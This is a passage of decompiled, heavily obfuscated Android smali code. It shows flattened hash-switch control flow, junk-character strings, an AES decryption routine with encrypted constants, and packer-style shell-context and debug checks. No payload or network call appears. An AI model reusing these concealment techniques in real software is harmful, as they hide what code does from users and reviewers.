    .end sparse-switch

    :sswitch_data_2b
    .sparse-switch
        -0x609f7dbd -> :sswitch_a0
        -0x5b698524 -> :sswitch_c1
        -0x470342c9 -> :sswitch_a1
        0x62098d06 -> :sswitch_9b
    .end sparse-switch

    :sswitch_data_2c
    .sparse-switch
        -0x2724fdea -> :sswitch_9f
        0x3ee194cf -> :sswitch_9c
        0x6ae8d91e -> :sswitch_9d
        0x780a0502 -> :sswitch_9e
    .end sparse-switch

    :sswitch_data_2d
    .sparse-switch
        -0x50c9b1d -> :sswitch_a9
        0xd991e14 -> :sswitch_a4
        0x3fafbb73 -> :sswitch_a2
        0x4239432d -> :sswitch_a8
    .end sparse-switch

    :sswitch_data_2e
    .sparse-switch
        -0x7872fb53 -> :sswitch_a3
        -0x53b8b127 -> :sswitch_a7
        -0x14987884 -> :sswitch_a6
        0x7c4cce93 -> :sswitch_a5
    .end sparse-switch

    :sswitch_data_2f
    .sparse-switch
        -0x72c30e65 -> :sswitch_aa
        -0x52c5f4ec -> :sswitch_b0
        -0x4f509345 -> :sswitch_b1
        -0x3765927 -> :sswitch_ac
    .end sparse-switch

    :sswitch_data_30
    .sparse-switch
        -0x1d92c9bc -> :sswitch_ae
        -0x1cb7a832 -> :sswitch_ad
        -0xf9aaf30 -> :sswitch_af
        0x3890c810 -> :sswitch_ab
    .end sparse-switch

    :sswitch_data_31
    .sparse-switch
        -0x7ab6b59b -> :sswitch_c0
        -0x7925b68b -> :sswitch_b2
        -0x27354522 -> :sswitch_b8
        -0x22c1bb97 -> :sswitch_b4
    .end sparse-switch

    :sswitch_data_32
    .sparse-switch
        -0x4d59611f -> :sswitch_b6
        -0x4261b7c9 -> :sswitch_b3
        0x49851397 -> :sswitch_b5
        0x4ce1a0a2 -> :sswitch_b7
    .end sparse-switch

    :sswitch_data_33
    .sparse-switch
        -0x645e7a45 -> :sswitch_bf
        0x43edc123 -> :sswitch_c1
        0x5347b80e -> :sswitch_bb
        0x590cb61a -> :sswitch_b9
    .end sparse-switch

    :sswitch_data_34
    .sparse-switch
        -0x1757e8f1 -> :sswitch_ba
        -0x9c7b194 -> :sswitch_bd
        0x2957d1ff -> :sswitch_bc
        0x54707247 -> :sswitch_be
    .end sparse-switch

    :sswitch_data_35
    .sparse-switch
        -0x5ed40044 -> :sswitch_c2
        -0x1a0d2180 -> :sswitch_c6
        -0x19c1b50f -> :sswitch_c5
        0x1023d39a -> :sswitch_c4
    .end sparse-switch

    :sswitch_data_36
    .sparse-switch
        -0x3ed5d76b -> :sswitch_ce
        -0x25fc6fac -> :sswitch_c8
        0x771b3c49 -> :sswitch_ca
        0x7fcaa521 -> :sswitch_de
    .end sparse-switch

    :sswitch_data_37
    .sparse-switch
        -0x2efac87a -> :sswitch_c9
        -0x15538b0b -> :sswitch_cd
        0x101f630b -> :sswitch_cc
        0x37badfb4 -> :sswitch_cb
    .end sparse-switch

    :sswitch_data_38
    .sparse-switch
        -0x39a380f6 -> :sswitch_cf
        -0x36ab9b70 -> :sswitch_d5
        0xefaab9a -> :sswitch_de
        0x2c7e90c0 -> :sswitch_d4
    .end sparse-switch

    :sswitch_data_39
    .sparse-switch
        0x1021b9c1 -> :sswitch_d1
        0x3ca0a98a -> :sswitch_d3
        0x41104dbb -> :sswitch_d0
        0x7b7aa7ec -> :sswitch_d2
    .end sparse-switch

    :sswitch_data_3a
    .sparse-switch
        -0x71f68a57 -> :sswitch_dd
        -0x6d1b0aa6 -> :sswitch_d6
        -0x13cb6b2e -> :sswitch_dc
        0x2eb45440 -> :sswitch_d8
    .end sparse-switch

    :sswitch_data_3b
    .sparse-switch
        -0x7e440bf1 -> :sswitch_da
        -0x2a1ee3c6 -> :sswitch_d9
        0x5721c942 -> :sswitch_d7
        0x760e7a1e -> :sswitch_db
    .end sparse-switch

    :sswitch_data_3c
    .sparse-switch
        -0x1680512e -> :sswitch_df
        -0x1455db5b -> :sswitch_e3
        0x54228b9 -> :sswitch_e8
        0x1d5f6dde -> :sswitch_e7
    .end sparse-switch

    :sswitch_data_3d
    .sparse-switch
        -0x839e8d5 -> :sswitch_ec
        0x17fc8a31 -> :sswitch_e0
        0x334da36f -> :sswitch_62
        0x51d312d8 -> :sswitch_ed
    .end sparse-switch

    :sswitch_data_3e
    .sparse-switch
        -0x78295eef -> :sswitch_e1
        -0x448a85a -> :sswitch_eb
        0x168082a0 -> :sswitch_ea
        0x4378878e -> :sswitch_e9
    .end sparse-switch

    :sswitch_data_3f
    .sparse-switch
        -0x10642ad7 -> :sswitch_e6
        0x18ef38c6 -> :sswitch_e2
        0x22cb498f -> :sswitch_e4
        0x6e238ac8 -> :sswitch_e5
    .end sparse-switch

    :sswitch_data_40
    .sparse-switch
        -0x261a07a6 -> :sswitch_ee
        -0x162a5de8 -> :sswitch_fc
        -0x152529f2 -> :sswitch_f0
        0x493ebc61 -> :sswitch_f4
    .end sparse-switch

    :sswitch_data_41
    .sparse-switch
        -0x3f61f5fa -> :sswitch_f3
        -0x28510d0e -> :sswitch_f2
        -0x117e0b39 -> :sswitch_ef
        0x33e6cf22 -> :sswitch_f1
    .end sparse-switch

    :sswitch_data_42
    .sparse-switch
        -0x6b9ef0bc -> :sswitch_fc
        -0x102c840e -> :sswitch_fa
        0x189988f6 -> :sswitch_fb
        0x686db25a -> :sswitch_f5
    .end sparse-switch

    :sswitch_data_43
    .sparse-switch
        -0x7fe6e507 -> :sswitch_f8
        -0x7e7ca1cf -> :sswitch_f9
        0x17024c22 -> :sswitch_f6
        0x3c4bc804 -> :sswitch_f7
    .end sparse-switch

    :sswitch_data_44
    .sparse-switch
        -0x779867b1 -> :sswitch_105
        -0x6dff0432 -> :sswitch_113
        -0x5d0170f8 -> :sswitch_109
        -0xe06163d -> :sswitch_103
    .end sparse-switch

    :sswitch_data_45
    .sparse-switch
        -0x274538b1 -> :sswitch_107
        0x4f37b386 -> :sswitch_106
        0x58958711 -> :sswitch_104
        0x66944faf -> :sswitch_108
    .end sparse-switch

    :sswitch_data_46
    .sparse-switch
        -0x5029046f -> :sswitch_10a
        -0x23112cf0 -> :sswitch_10b
        -0x7193a2b -> :sswitch_10e
        0x7f801a54 -> :sswitch_112
    .end sparse-switch

    :sswitch_data_47
    .sparse-switch
        -0x6eeb24b6 -> :sswitch_10c
        -0x39da5922 -> :sswitch_13f
        -0x2f90a4a4 -> :sswitch_139
        -0x201b4d0d -> :sswitch_13d
    .end sparse-switch

    :sswitch_data_48
    .sparse-switch
        -0x73a6a03e -> :sswitch_10d
        -0x296e0af7 -> :sswitch_110
        -0xf446f86 -> :sswitch_111
        0x69084b73 -> :sswitch_10f
    .end sparse-switch

    :sswitch_data_49
    .sparse-switch
        -0x59b80df0 -> :sswitch_11a
        -0x4cd2bf10 -> :sswitch_116
        0x3d8650e -> :sswitch_114
        0x6ba98621 -> :sswitch_10b
    .end sparse-switch

    :sswitch_data_4a
    .sparse-switch
        -0x6aca1193 -> :sswitch_119
        -0x581d3ec3 -> :sswitch_117
        -0x226d7d1d -> :sswitch_118
        0x5e0013cd -> :sswitch_115
    .end sparse-switch

    :sswitch_data_4b
    .sparse-switch
        0x2b5a8f01 -> :sswitch_11f
        0x2effce5a -> :sswitch_11b
        0x4d906c0b -> :sswitch_11c
        0x7f688bb4 -> :sswitch_123
    .end sparse-switch

    :sswitch_data_4c
    .sparse-switch
        -0x6cc7b1bb -> :sswitch_11d
        -0x6b0504b8 -> :sswitch_129
        -0x30e8d4d9 -> :sswitch_125
        0x79c14f2a -> :sswitch_11c
    .end sparse-switch

    :sswitch_data_4d
    .sparse-switch
        -0x5474b76f -> :sswitch_130
        -0x378af2f6 -> :sswitch_11d
        -0xc015eff -> :sswitch_12b
        -0x781695c -> :sswitch_12f
    .end sparse-switch

    :sswitch_data_4e
    .sparse-switch
        -0x3e42e515 -> :sswitch_121
        -0x12560578 -> :sswitch_120
        0x1429cad -> :sswitch_11e
        0x1de765bf -> :sswitch_122
    .end sparse-switch

    :sswitch_data_4f
    .sparse-switch
        -0x270827c2 -> :sswitch_127
        -0x1c763fce -> :sswitch_126
        0x10235ca2 -> :sswitch_124
        0x2cd056f8 -> :sswitch_128
    .end sparse-switch

    :sswitch_data_50
    .sparse-switch
        -0x65c04639 -> :sswitch_12c
        -0x19f5fe7c -> :sswitch_12a
        -0x1707380 -> :sswitch_12d
        0x15351f07 -> :sswitch_12e
    .end sparse-switch

    :sswitch_data_51
    .sparse-switch
        -0x736a9b55 -> :sswitch_133
        -0x5c3e9b5a -> :sswitch_62
        -0x14fe17ce -> :sswitch_131
        0x616531c7 -> :sswitch_137
    .end sparse-switch

    :sswitch_data_52
    .sparse-switch
        -0x289f95c2 -> :sswitch_134
        0x1b48dd7e -> :sswitch_135
        0x45dcba51 -> :sswitch_136
        0x6f62fc72 -> :sswitch_132
    .end sparse-switch

    :sswitch_data_53
    .sparse-switch
        -0x3f9f4789 -> :sswitch_138
        -0x2cec8a0 -> :sswitch_13c
        0x5ae2fb6 -> :sswitch_13a
        0x17d55108 -> :sswitch_13b
    .end sparse-switch
.end method

.method public static decrypt(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;
    .locals 14
    .annotation system Ldalvik/annotation/Throws;
        value = {
            Ljava/lang/Exception;
        }
    .end annotation

    const/16 v13, 0x23d

    const/4 v12, 0x2

    const/16 v11, 0x10

    const/4 v7, 0x0

    const/4 v2, 0x0

    const-string v0, "\u06e1\u06d8\u06d9\u06e0\u06e1\u06e5\u06e7\u06e7\u06e4\u06e5\u06da\u06d8\u06d8\u06e8\u06e4\u06eb\u06d9\u06e2\u06e8\u06d8\u06d7\u06db\u06d8\u06d8\u06e8\u06d7\u06db\u06e4\u06e1\u06d8\u06e0\u06d7\u06e8\u06d8\u06d6\u06d7\u06e2\u06e5\u06e0\u06d8\u06d8\u06e2\u06dc\u06d6\u06e6\u06d7\u06e2\u06e4\u06dc\u06d9\u06df\u06d8\u06df"

    move-object v1, v2

    move-object v3, v2

    move-object v4, v2

    move-object v5, v2

    move v6, v7

    move-object v8, v2

    move-object v9, v2

    :goto_0
    invoke-virtual {v0}, Ljava/lang/String;->hashCode()I

    move-result v2

    xor-int/2addr v2, v13

    xor-int/lit16 v2, v2, 0x238

    const v10, -0x5598e894

    xor-int/2addr v2, v13

    xor-int/2addr v2, v10

    sparse-switch v2, :sswitch_data_0

    goto :goto_0

    :sswitch_0
    const-string v0, "\u06e0\u06da\u06e8\u06d8\u06e0\u06e5\u06e6\u06d8\u06e4\u06e4\u06e2\u06eb\u06d9\u06e6\u06d8\u06d9\u06d8\u06e0\u06da\u06df\u06dc\u06e0\u06e5\u06e6\u06e0\u06e6\u06df\u06df\u06eb\u06d7\u06dc\u06db\u06d7\u06e7\u06d8\u06e7\u06dc\u06e1\u06d9"

    goto :goto_0

    :sswitch_1
    const-string v0, "\u06e6\u06e0\u06d8\u06d8\u06e1\u06dc\u06d6\u06d6\u06ec\u06e0\u06e0\u06e4\u06d6\u06e1\u06e4\u06dc\u06eb\u06e2\u06ec\u06e7\u06df\u06e4\u06d7\u06dc\u06db\u06dc\u06d6\u06d9\u06e0\u06e5\u06e5\u06e8\u06da\u06dc\u06da\u06e5\u06da\u06df\u06df\u06e2\u06ec\u06df\u06ec\u06e1\u06da\u06e5\u06da\u06e6\u06d8"

    goto :goto_0

    :sswitch_2
    invoke-static {p0, v12}, Landroid/util/Base64;->decode(Ljava/lang/String;I)[B

    move-result-object v2

    const-string v0, "\u06d9\u06e0\u06e6\u06d8\u06dc\u06d6\u06e5\u06da\u06e8\u06d7\u06e1\u06d8\u06e6\u06d7\u06e8\u06d8\u06d7\u06da\u06db\u06dc\u06d8\u06eb\u06d9\u06e5\u06ec\u06d7\u06df\u06e1\u06eb\u06d6\u06eb\u06e0\u06db\u06d8\u06d8\u06e2\u06d8\u06d6\u06d8\u06db\u06db\u06e5\u06d6\u06d7\u06da"

    move-object v9, v2

    goto :goto_0

    :sswitch_3
    new-array v2, v11, [B

    const-string v0, "\u06dc\u06e4\u06e8\u06e1\u06da\u06d7\u06db\u06d8\u06e1\u06d7\u06dc\u06ec\u06d9\u06e6\u06d8\u06df\u06da\u06e1\u06dc\u06eb\u06d8\u06d8\u06d6\u06e8\u06e5\u06d8\u06e6\u06e4\u06e2\u06d7\u06e6\u06df"

    move-object v8, v2

    goto :goto_0

    :sswitch_4
    invoke-static {v9, v7, v8, v7, v11}, Ljava/lang/System;->arraycopy(Ljava/lang/Object;ILjava/lang/Object;II)V

    const-string v0, "\u06e6\u06d9\u06e7\u06e4\u06e0\u06e8\u06e7\u06df\u06eb\u06ec\u06da\u06da\u06e2\u06e7\u06e7\u06d7\u06d6\u06ec\u06e4\u06e2\u06e1\u06e1\u06e2\u06e8\u06e6\u06e5\u06d8\u06e5\u06e7\u06ec\u06eb\u06d7\u06dc\u06d8\u06e0\u06e6\u06dc\u06df\u06dc\u06e5\u06d8\u06e1\u06e7"

    goto :goto_0

    :sswitch_5
    array-length v0, v9

    add-int/lit8 v2, v0, -0x10

    const-string v0, "\u06df\u06e0\u06e2\u06e5\u06e6\u06e2\u06db\u06e6\u06d9\u06df\u06e1\u06df\u06e4\u06d9\u06e2\u06e6\u06da\u06e8\u06d8\u06e6\u06d7\u06d8\u06d8\u06db\u06e7\u06df\u06ec\u06e6\u06e8\u06d8\u06e6\u06da\u06d9\u06e5\u06d8\u06db\u06e2\u06db\u06d6"

    move v6, v2

    goto :goto_0

    :sswitch_6
    new-array v2, v6, [B

    const-string v0, "\u06e0\u06d8\u06e6\u06d8\u06eb\u06e5\u06d6\u06d8\u06e6\u06e4\u06d6\u06e5\u06d9\u06da\u06d6\u06d9\u06e5\u06d8\u06d9\u06e2\u06e6\u06e6\u06e7\u06ec\u06e5\u06e7\u06d7\u06d8\u06d9\u06df\u06d7\u06df\u06db\u06df\u06d6\u06e7\u06d8\u06ec\u06d7\u06e8\u06d8\u06d6\u06e5\u06d9\u06e2\u06d9\u06df"

    move-object v5, v2

    goto :goto_0

    :sswitch_7
    invoke-static {v9, v11, v5, v7, v6}, Ljava/lang/System;->arraycopy(Ljava/lang/Object;ILjava/lang/Object;II)V

    const-string v0, "\u06da\u06d6\u06e8\u06d8\u06d6\u06d8\u06e6\u06d8\u06dc\u06dc\u06d6\u06e8\u06db\u06e6\u06dc\u06df\u06d7\u06dc\u06eb\u06d6\u06d8\u06e0\u06e6\u06d8\u06e2\u06d8\u06d8\u06da\u06dc\u06eb\u06e8\u06da\u06ec\u06d7\u06db\u06eb\u06dc\u06e8\u06e0\u06e4\u06df\u06e7\u06da\u06df\u06d8"

    goto :goto_0

    :sswitch_8
    new-instance v2, Ljavax/crypto/spec/IvParameterSpec;

    invoke-direct {v2, v8}, Ljavax/crypto/spec/IvParameterSpec;-><init>([B)V

    const-string v0, "\u06e5\u06e8\u06e2\u06d6\u06dc\u06d8\u06d8\u06d6\u06e6\u06da\u06d9\u06e1\u06d8\u06d9\u06e0\u06d8\u06e5\u06e5\u06e7\u06ec\u06d8\u06da\u06d9\u06e6\u06d6\u06d8\u06d9\u06e7\u06dc\u06d8\u06dc\u06e6\u06e7\u06d8\u06eb\u06e6\u06d8\u06e5\u06dc\u06dc\u06eb\u06da\u06dc\u06d8\u06df\u06d9"

    move-object v4, v2

    goto :goto_0

    :sswitch_9
    new-instance v2, Ljavax/crypto/spec/SecretKeySpec;

    const-string v0, "wNPNLfU=\n"

    const-string v3, "lYeLAM0l/Wc=\n"

    invoke-static {v0, v3}, Landroidx/base/연산;->decrypt(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {p1, v0}, Ljava/lang/String;->getBytes(Ljava/lang/String;)[B

    move-result-object v0

    const-string v3, "e27l\n"

    const-string v10, "Oiu2dvRSZTU=\n"

    invoke-static {v3, v10}, Landroidx/base/연산;->decrypt(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    invoke-direct {v2, v0, v3}, Ljavax/crypto/spec/SecretKeySpec;-><init>([BLjava/lang/String;)V

    const-string v0, "\u06e7\u06d7\u06eb\u06eb\u06e7\u06e4\u06d7\u06e2\u06d7\u06e1\u06e7\u06e0\u06e5\u06e2\u06d8\u06df\u06d6\u06e7\u06e8\u06e6\u06eb\u06e4\u06d6\u06e7\u06d8\u06e5\u06d8\u06e1\u06eb\u06e5\u06e8\u06d8"

    move-object v3, v2

    goto :goto_0

    :sswitch_a
    const-string v0, "hvFPixrdTKWX/1/3bM9u7qPdcsM=\n"

    const-string v1, "x7QcpFmfD4o=\n"

    invoke-static {v0, v1}, Landroidx/base/연산;->decrypt(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-static {v0}, Ljavax/crypto/Cipher;->getInstance(Ljava/lang/String;)Ljavax/crypto/Cipher;

    move-result-object v1

    const-string v0, "\u06dc\u06e7\u06e5\u06d9\u06d6\u06db\u06d7\u06da\u06d9\u06db\u06df\u06d7\u06d8\u06e2\u06d9\u06dc\u06eb\u06d6\u06d8\u06d6\u06e4\u06df\u06e6\u06eb\u06e1\u06d8\u06e1\u06dc\u06d6\u06d8\u06e6\u06e6\u06dc\u06df\u06e2\u06da\u06db\u06eb\u06e5\u06da\u06d7\u06e1\u06d8\u06ec\u06e0\u06e4"

    goto :goto_0

    :sswitch_b
    invoke-virtual {v1, v12, v3, v4}, Ljavax/crypto/Cipher;->init(ILjava/security/Key;Ljava/security/spec/AlgorithmParameterSpec;)V

    const-string v0, "\u06e1\u06e6\u06e2\u06e8\u06d8\u06da\u06e8\u06e8\u06d6\u06eb\u06dc\u06dc\u06e8\u06e1\u06dc\u06eb\u06dc\u06d8\u06d6\u06e4\u06e5\u06df\u06e4\u06e0\u06e4\u06dc\u06e4\u06e1\u06eb\u06e7\u06db\u06ec\u06d7\u06d7\u06d6\u06e1\u06e5\u06d7\u06e8\u06d8\u06e2\u06d9\u06e0\u06da\u06e1\u06d8\u06dc\u06e2\u06eb"

    goto :goto_0

    :sswitch_c
    new-instance v0, Ljava/lang/String;

    invoke-virtual {v1, v5}, Ljavax/crypto/Cipher;->doFinal([B)[B

    move-result-object v1

    const-string v2, "RY0AzZA=\n"

    const-string v3, "ENlG4KhZBn4=\n"

    invoke-static {v2, v3}, Landroidx/base/연산;->decrypt(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    invoke-direct {v0, v1, v2}, Ljava/lang/String;-><init>([BLjava/lang/String;)V

    return-object v0

    :sswitch_data_0
    .sparse-switch
        -0x6eb055a4 -> :sswitch_3
        -0x5b6833d4 -> :sswitch_a
        -0x52b30910 -> :sswitch_c
        -0x5130b601 -> :sswitch_0
        -0x4fa43d1c -> :sswitch_6
        -0x441c1d19 -> :sswitch_5
        -0x3db5e5c6 -> :sswitch_9
        -0x11347f07 -> :sswitch_b
        -0x10b41759 -> :sswitch_7
        0x5046b48 -> :sswitch_4
        0xba19c49 -> :sswitch_8
        0x42bf29f8 -> :sswitch_2
        0x60aca0ae -> :sswitch_1
    .end sparse-switch
.end method

.method public static getJsonResult()Lorg/json/JSONObject;
    .locals 4

    const-string v0, "\u06ec\u06e0\u06e5\u06d8\u06d6\u06ec\u06d7\u06e4\u06da\u06e0\u06e0\u06e7\u06df\u06da\u06da\u06da\u06d8\u06e0\u06db\u06df\u06d8\u06e7\u06d8\u06e2\u06e0\u06e8\u06d8\u06ec\u06d8\u06e7\u06d8\u06da\u06ec\u06e0\u06db\u06dc\u06e7\u06d7\u06d9\u06da\u06e6\u06e5\u06e6\u06e7\u06dc\u06e0\u06e6\u06e0\u06eb\u06eb"

    :goto_0
    invoke-virtual {v0}, Ljava/lang/String;->hashCode()I

    move-result v1

    const/16 v2, 0x28b

    xor-int/2addr v1, v2

    xor-int/lit8 v1, v1, 0x5e

    const/16 v2, 0x3c8

    const v3, 0x34b4058b

    xor-int/2addr v1, v2

    xor-int/2addr v1, v3

    sparse-switch v1, :sswitch_data_0

    goto :goto_0

    :sswitch_0
    const v1, -0x4c22d4dd

    const-string v0, "\u06ec\u06e7\u06dc\u06df\u06e1\u06d6\u06d8\u06d8\u06d8\u06db\u06e1\u06df\u06e0\u06eb\u06da\u06df\u06e7\u06dc\u06e7\u06dc\u06e8\u06e5\u06d8\u06e1\u06e2\u06e4\u06e1\u06df\u06e6\u06e5\u06da\u06db\u06eb\u06e1\u06e6\u06ec\u06dc\u06e5\u06ec\u06df\u06d6\u06d6\u06eb\u06d8\u06e1\u06d9\u06e2\u06db\u06df\u06da\u06e4\u06e4\u06ec\u06db\u06d9"

    :goto_1
    invoke-virtual {v0}, Ljava/lang/String;->hashCode()I

    move-result v2

    xor-int/2addr v2, v1

    sparse-switch v2, :sswitch_data_1

    goto :goto_1

    :sswitch_1
    const-string v0, "\u06d9\u06da\u06dc\u06d8\u06e7\u06d9\u06d6\u06d8\u06e7\u06e2\u06da\u06df\u06e6\u06e4\u06db\u06df\u06dc\u06d6\u06e7\u06d9\u06db\u06e7\u06dc\u06e1\u06e6\u06db\u06ec\u06e1\u06d9\u06e7\u06d6\u06d9\u06d7\u06e8\u06d7\u06e4\u06eb\u06dc\u06d8\u06d6\u06df\u06e7\u06da\u06e8\u06e5\u06d8"

    goto :goto_1

    :sswitch_2
    const-string v0, "\u06e0\u06e6\u06d9\u06ec\u06d9\u06e5\u06e5\u06e6\u06e7\u06e8\u06e6\u06e7\u06e5\u06d6\u06e8\u06d8\u06d8\u06e6\u06ec\u06d6\u06e8\u06e6\u06ec\u06e8\u06df\u06d6\u06ec\u06e8\u06da\u06db\u06e0"

    goto :goto_1

    :sswitch_3
    const v2, 0x437f232f

    const-string v0, "\u06df\u06e4\u06ec\u06d9\u06db\u06d8\u06e5\u06d8\u06e8\u06df\u06d9\u06da\u06d6\u06ec\u06e4\u06db\u06e1\u06d8\u06ec\u06e0\u06db\u06e6\u06e8\u06e8\u06db\u06e6\u06e7\u06d8\u06e1\u06d7\u06eb\u06dc\u06e0\u06d6\u06d8\u06e7\u06e0\u06d7\u06d8\u06e5\u06dc\u06e8\u06db\u06d8\u06d8\u06e7\u06db\u06d7\u06d7\u06dc\u06db"

    :goto_2
    invoke-virtual {v0}, Ljava/lang/String;->hashCode()I

    move-result v3

    xor-int/2addr v3, v2

    sparse-switch v3, :sswitch_data_2

    goto :goto_2

    :sswitch_4
    const-string v0, "\u06da\u06e4\u06e2\u06e1\u06e0\u06d6\u06e7\u06d8\u06e1\u06e2\u06e5\u06e6\u06d7\u06e2\u06e4\u06e4\u06e6\u06d8\u06e0\u06da\u06db\u06e6\u06d6\u06d8\u06d6\u06e6\u06e7\u06d8\u06e8\u06eb\u06e4\u06db\u06d8\u06d7\u06da\u06e1\u06ec\u06e0\u06e6\u06df\u06df\u06e5\u06db\u06db\u06dc\u06e1\u06e5\u06da"

    goto :goto_1

    :cond_0
    const-string v0, "\u06e2\u06e8\u06d6\u06d8\u06e8\u06e5\u06e6\u06e8\u06e7\u06eb\u06d9\u06eb\u06ec\u06db\u06eb\u06db\u06e0\u06e7\u06ec\u06e0\u06e2\u06e6\u06d8\u06e1\u06e6\u06db\u06d8\u06e2\u06e6\u06d8\u06ec\u06e0\u06eb\u06df\u06df\u06db\u06d8\u06e5\u06db\u06e4\u06e0\u06da\u06da\u06e0\u06d6\u06d8\u06db\u06e7\u06df\u06da\u06eb\u06dc\u06d9\u06d7\u06eb\u06e5\u06d8\u06e6"

    goto :goto_2

    :sswitch_5
    invoke-static {}, Lcom/netease/mc/m439a/kgKPsAcxcvLVr;->getShellContext()Landroid/content/Context;

    move-result-object v0

    invoke-static {v0}, LKvrUY/RiiGL/Utils;->isRequest(Landroid/content/Context;)Z

    move-result v0

    if-eqz v0, :cond_0

    const-string v0, "\u06e7\u06d8\u06e1\u06d8\u06e0\u06e0\u06da\u06d9\u06d6\u06d9\u06e5\u06d6\u06db\u06e2\u06d8\u06d8\u06dc\u06e5\u06d6\u06ec\u06e0\u06e8\u06d8\u06ec\u06e8\u06e2\u06eb\u06d8\u06e4\u06e1\u06e5\u06da"

    goto :goto_2

    :sswitch_6
    const-string v0, "\u06eb\u06d6\u06e6\u06df\u06ec\u06da\u06e4\u06df\u06d6\u06d9\u06dc\u06e7\u06d8\u06eb\u06d8\u06e2\u06d8\u06e4\u06e1\u06d8\u06da\u06dc\u06e8\u06d8\u06e0\u06db\u06d6\u06d8\u06dc\u06e6\u06d8\u06e6\u06e8\u06e8\u06d7\u06e8\u06dc\u06d8\u06e1\u06e8\u06e5\u06e2\u06e7\u06e8\u06e1\u06d8\u06da"

    goto :goto_2

    :sswitch_7
    const-string v0, "\u06e6\u06e1\u06df\u06d9\u06d7\u06da\u06e1\u06e8\u06e7\u06d8\u06e4\u06e5\u06d8\u06ec\u06e0\u06e5\u06d8\u06d6\u06df\u06e5\u06d8\u06e7\u06e1\u06d9\u06e2\u06e8\u06e4\u06d7\u06d6\u06d9\u06da\u06d9\u06db\u06e1\u06df\u06d8\u06e0\u06e1\u06d6\u06d8\u06ec\u06dc\u06e6\u06d8\u06d7\u06d6\u06d9\u06da\u06e0\u06e0\u06e5\u06e7\u06da"

    goto :goto_0

    :sswitch_8
    invoke-static {}, Landroidx/base/복원;->getJsonResult()Lorg/json/JSONObject;

    move-result-object v0

    :goto_3
    return-object v0

    :sswitch_9
    sget-object v0, Landroidx/base/저장;->b:Lorg/json/JSONObject;

    goto :goto_3

    :sswitch_a
    const-string v0, "\u06df\u06df\u06db\u06d6\u06e6\u06d7\u06e2\u06d7\u06e5\u06d6\u06eb\u06e5\u06d8\u06da\u06e6\u06e8\u06d8\u06dc\u06e7\u06d8\u06d8\u06e8\u06e5\u06d6\u06d8\u06e2\u06d7\u06dc\u06d8\u06e7\u06d6\u06eb\u06d8\u06e8\u06e1\u06d8\u06da\u06e5\u06dc\u06d8\u06e7\u06d9\u06e8\u06e7\u06e7\u06e6\u06d8\u06e2\u06d6\u06e8\u06d8\u06db\u06e8\u06e2\u06ec\u06e4\u06dc"

    goto :goto_0

    :sswitch_data_0
    .sparse-switch
        -0x1c825f22 -> :sswitch_0
        0x1b060ed2 -> :sswitch_8
        0x78c47002 -> :sswitch_9
    .end sparse-switch

    :sswitch_data_1
    .sparse-switch
        -0x69154319 -> :sswitch_1
        -0x48265e8e -> :sswitch_a
        0x25e89622 -> :sswitch_7
        0x7b4f31a6 -> :sswitch_3
    .end sparse-switch

    :sswitch_data_2
    .sparse-switch
        -0x5252fe27 -> :sswitch_6
        -0x328b6ea0 -> :sswitch_4
        0x5c73fd60 -> :sswitch_2
        0x6b930ff6 -> :sswitch_5
    .end sparse-switch
.end method

.method public static getisRequesting()Z
    .locals 4

    const-string v0, "\u06e1\u06d7\u06e5\u06e1\u06e5\u06d8\u06d8\u06e1\u06e4\u06dc\u06d8\u06dc\u06e0\u06e7\u06e7\u06da\u06d6\u06d8\u06d6\u06db\u06d7\u06ec\u06e7\u06e1\u06e1\u06e7\u06dc\u06e5\u06e4\u06df\u06df\u06e5\u06e7\u06db\u06db\u06e6\u06d8\u06d6\u06e5\u06e1\u06d8\u06e6\u06e8\u06e6\u06e1\u06e6\u06d6\u06da\u06d8\u06e0\u06e1\u06e8\u06e7"

    :goto_0
    invoke-virtual {v0}, Ljava/lang/String;->hashCode()I

    move-result v1

    const/16 v2, 0x126

    xor-int/2addr v1, v2

    xor-int/lit16 v1, v1, 0x89

    const/16 v2, 0xd5

    const v3, 0x3a6aa78a

    xor-int/2addr v1, v2

    xor-int/2addr v1, v3

    packed-switch v1, :pswitch_data_0

    goto :goto_0

    :pswitch_0
    sget-boolean v0, Landroidx/base/저장;->a:Z

    return v0

    nop

    :pswitch_data_0
    .packed-switch 0x5c02a970
        :pswitch_0
    .end packed-switch
.end method

.method public static isDebug()Z
    .locals 4

    const-string v0, "\u06e1\u06d6\u06e5\u06d7\u06e8\u06df\u06d7\u06e8\u06d9\u06dc\u06da\u06d9\u06ec\u06e5\u06eb\u06db\u06e8\u06d8\u06db\u06dc\u06e5\u06e0\u06e0\u06e4\u06e5\u06e6\u06d8\u06e6\u06e1\u06d6\u06d8\u06d8\u06d9\u06e6\u06e7\u06d8\u06ec\u06ec\u06d7\u06d6\u06d9\u06e8"

    :goto_0
    invoke-virtual {v0}, Ljava/lang/String;->hashCode()I

    move-result v1

    const/16 v2, 0x29b

    xor-int/2addr v1, v2

    xor-int/lit16 v1, v1, 0xe8

    const/16 v2, 0x389

    const v3, 0x677a1628    # 1.1810003E24f

    xor-int/2addr v1, v2

    xor-int/2addr v1, v3

    sparse-switch v1, :sswitch_data_0

    goto :goto_0

    :sswitch_0
    const v1, 0x1dc4dd35

    const-string v0, "\u06d9\u06d8\u06eb\u06db\u06d6\u06d6\u06ec\u06d7\u06e1\u06e6\u06e4\u06d6\u06d8\u06e0\u06e4\u06e1\u06d8\u06e5\u06eb\u06dc\u06e1\u06da\u06e7\u06df\u06e0\u06e6\u06d8\u06e8\u06e2\u06e6\u06d8\u06db\u06da\u06d8\u06d8\u06e1\u06e2\u06d6\u06eb\u06e4\u06d6\u06d8\u06da\u06d7\u06eb\u06e6\u06df\u06ec\u06d8\u06e4\u06d8\u06d8\u06df\u06ec\u06eb\u06e8\u06d7\u06d8\u06da\u06ec\u06e8"

    :goto_1
    invoke-virtual {v0}, Ljava/lang/String;->hashCode()I

    move-result v2

    xor-int/2addr v2, v1

    sparse-switch v2, :sswitch_data_1

    goto :goto_1

    :sswitch_1
    const v2, -0x2b757a47

